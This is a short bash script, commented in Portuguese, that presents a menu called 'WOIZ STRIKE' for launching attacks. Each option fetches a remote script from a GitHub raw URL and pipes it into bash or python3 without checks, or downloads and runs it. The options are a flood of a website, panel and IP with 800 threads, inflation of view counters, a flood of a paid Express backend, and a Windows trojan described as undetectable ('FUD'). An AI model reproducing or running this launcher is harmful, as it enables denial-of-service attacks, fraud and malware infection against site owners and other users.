#!/usr/bin/env bash
# WOIZ STRIKE MENU - 1 comando, escolhe numero e ja ataca
set -e
RAW="https://raw.githubusercontent.com/Hhhaofuqoc/woiz-strike/main"
clear
echo "=============================="
echo "      W O I Z  S T R I K E"
echo "=============================="
echo " [1] FLOOD SITE+PAINEL+IP (800 threads)"
echo " [2] CONTADOR INFLACAO (visualizacoes)"
echo " [3] FLOOD BACKEND EXPRESS (POST pago)"
echo " [4] TROJAN FUD (windows)"
echo " [0] SAIR"
echo -n "digite o numero: "; read OP < /dev/tty
case "$OP" in
  1) curl -skL $RAW/woiz_strike.sh | bash ;;
  2) curl -skL $RAW/views_inflate.py | python3 - 20 ;;
  3) curl -skL $RAW/backend_trace.py | python3 - 15 ;;
  4) curl -skL $RAW/woiz_fud.py -o woiz_fud.py && python3 woiz_fud.py ;;
  *) echo "saindo..."; exit 0 ;;
esac
